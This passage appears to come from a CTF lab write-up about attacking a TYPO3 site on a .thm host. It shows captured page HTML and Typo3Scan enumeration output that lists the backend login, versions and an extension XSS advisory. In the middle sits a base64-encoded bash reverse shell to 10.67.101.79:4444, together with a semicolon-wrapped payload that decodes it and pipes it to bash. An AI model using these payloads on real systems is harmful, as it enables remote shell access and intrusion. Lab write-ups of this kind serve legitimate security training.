to open source. Safe, reliable, no hidden agenda, no license jungle or legal issues, zero license fees. As a website owner, your investment in a TYPO3 CMS web application customized to perfectly match your requirements means you own your mission critical web infrastructure. No one can take that software back, unilaterally increase your licensing costs, or prevent you from improving and extending it.</p></div></div></div></div></div></div></section><section class="section footer-section footer-section-meta"><div class="frame frame-background-none frame-space-before-none frame-space-after-none"><div class="frame-container"><div class="frame-inner"><div class="footer-language"><ul id="language_menu" class="language-menu"><li class="active "><a href="/index.php?id=38&amp;tx_form_formframework%5Baction%5D=perform&amp;tx_form_formframework%5Bcontroller%5D=FormFrontend&amp;L=0&amp;cHash=63896b2174306c4f96ada29453d1cd18" hreflang="en-US" title="Default"><span>Default</span></a></li><li class=" text-muted"><span>German</span></li><li class=" text-muted"><span>Dansk</span></li></ul></div><div class="footer-copyright"><p>Running with <a href="http://www.typo3.org" target="_blank" rel="noopener">TYPO3</a> and <a href="https://www.bootstrap-package.com" target="_blank" rel="noopener">Bootstrap Package</a>.</p></div><div class="footer-sociallinks"><div class="sociallinks"><ul class="sociallinks-list"><li class="sociallinks-item sociallinks-item-facebook" title="Facebook"><a class="sociallinks-link sociallinks-link-facebook" href="https://www.facebook.com/typo3/" rel="noopener" target="_blank"><span class="sociallinks-link-icon bootstrappackageicon bootstrappackageicon-facebook"></span><span class="sociallinks-link-label">Facebook</span></a></li><li class="sociallinks-item sociallinks-item-twitter" title="Twitter"><a class="sociallinks-link sociallinks-link-twitter" href="https://twitter.com/typo3" rel="noopener" target="_blank"><span class="sociallinks-link-icon bootstrappackageicon bootstrappackageicon-twitter"></span><span class="sociallinks-link-label">Twitter</span></a></li><li class="sociallinks-item sociallinks-item-github" title="GitHub"><a class="sociallinks-link sociallinks-link-github" href="https://github.com/TYPO3/TYPO3.CMS" rel="noopener" target="_blank"><span class="sociallinks-link-icon bootstrappackageicon bootstrappackageicon-github"></span><span class="sociallinks-link-label">GitHub</span></a></li><li class="sociallinks-item sociallinks-item-youtube" title="YouTube"><a class="sociallinks-link sociallinks-link-youtube" href="https://www.youtube.com/user/typo3" rel="noopener" target="_blank"><span class="sociallinks-link-icon bootstrappackageicon bootstrappackageicon-youtube"></span><span class="sociallinks-link-label">YouTube</span></a></li></ul></div></div></div></div></div></section></footer><a class="scroll-top" title="Scroll to top" href="#top"><span class="scroll-top-icon"></span></a></div>
+<script src="/typo3temp/assets/compressed/merged-31caf97aa732fbd68e6f74b2626dbc35.js?1610205876" type="text/javascript"></script>
+
+
+
+
+</body>
+</html>(venv)...:~/Typo3Scan# 
+```
+
+
+
+<img width="1364" height="754" alt="image" src="https://github.com/user-attachments/assets/38d76e6b-9eca-4401-85f4-d108ec24852c" />
+
+<img width="1356" height="550" alt="image" src="https://github.com/user-attachments/assets/65e8c999-7a89-4acd-beb3-c5d427671bfc" />
+
+<img width="1293" height="522" alt="image" src="https://github.com/user-attachments/assets/94895a5a-2d3f-4de6-ab58-3f1b9d408682" />
+
+:~# echo "bash -i >& /dev/tcp/10.67.101.79/4444 0>&1" | base64 -w0
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC42Ny4xMDEuNzkvNDQ0NCAwPiYxCg==
+
+
+
+;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC42Ny4xMDEuNzkvNDQ0NCAwPiYxCg==|base64 -d|bash;
+
+
+<img width="1300" height="767" alt="image" src="https://github.com/user-attachments/assets/6254746f-6bad-4375-acf1-7e7fa684cd02" />
+
+<img width="1308" height="652" alt="image" src="https://github.com/user-attachments/assets/fd5dcbd5-e2e2-4d42-9462-4390c723d7b5" />
+
+<img width="1294" height="538" alt="image" src="https://github.com/user-attachments/assets/01bf7a70-ee40-4415-ae2b-379f39c0ea10" />
+
+
+
+
+
+```bash
+(venv) ...:~/Typo3Scan# cat a.txt
+```
+
+~/Typo3Scan# head -n 150 a.txt
+
+=========================================================================
+
+   ________                   ________   _________                       
+   \_    _/__ __ ______  _____\_____  \ /   _____/ ____ _____    ___     
+     |  | |  |  |\____ \|  _  | _(__  < \_____  \_/ ___\\__  \  /   \    
+     |  | |___  ||  |_) | (_) |/       \/        \  \___ / __ \|  |  \   
+     |__| / ____||   __/|_____|________/_________/\_____|_____/|__|__/   
+          \/     |__|                                                    
+
+                     Automatic Typo3 enumeration tool                    
+                               Version 1.2                               
+                         https://github.com/whoot                        
+=========================================================================
+
+
+[ Checking http://maintest.enterprize.thm ]
+-------------------------------------------------------------------------
+
+ [+] Core Information
+ --------------------
+ [+] Backend Login
+  \u251c http://maintest.enterprize.thm/typo3/index.php
+ [+] Version Information
+  \u251c Identified Version:     9.5
+  \u251c Could not identify exact version.
+  \u251c Do you want to print all vulnerabilities for branch 9.5? (y/n): 
+ [+] Extension Search
+  \u251c Brute-Forcing 8808 Extensions
+
+  \u251c Found 2 extensions
+  \u251c Brute-Forcing Version Information
+ [!] Version detection for extensions is unreliable. Verify manually!
+
+
+ [+] Extension Information
+ -------------------------
+  [+] bootstrap_package
+   \u251c Extension Title:       Bootstrap Package
+   \u251c Extension Repo:        https://extensions.typo3.org/extension/bootstrap_package
+   \u251c Extension Url:         http://maintest.enterprize.thm/typo3conf/ext/bootstrap_package
+   \u251c Current Version:       14.0.7 (stable)
+   \u251c Identified Version:    10.0.9
+   \u251c Version File:          http://maintest.enterprize.thm/typo3conf/ext/bootstrap_package/CHANGELOG.md
+   \u2514 Known Vulnerabilities:
+
+     [!] TYPO3-EXT-SA-2021-007
+      \u251c Vulnerability Type: Cross-Site Scripting
+      \u251c Affected Versions:  10.0.9 - 10.0.0
+      \u2514 Advisory Url:       https://typo3.org/security/advisory/typo3-ext-sa-2021-007
+
+
+  [+] introduction
+   \u251c Extension Title:       The Official TYPO3 Introduction Package
+   \u251c Extension Repo:        https://extensions.typo3.org/extension/introduction
+   \u251c Extension Url:         http://maintest.enterprize.thm/typo3conf/ext/introduction
+   \u251c Current Version:       4.6.1 (stable)
+   \u251c Identified Version:    3.1.1
+   \u2514 Version File:          http://maintest.enterprize.thm/typo3conf/ext/introduction/Documentation/Settings.cfg
 
 
 
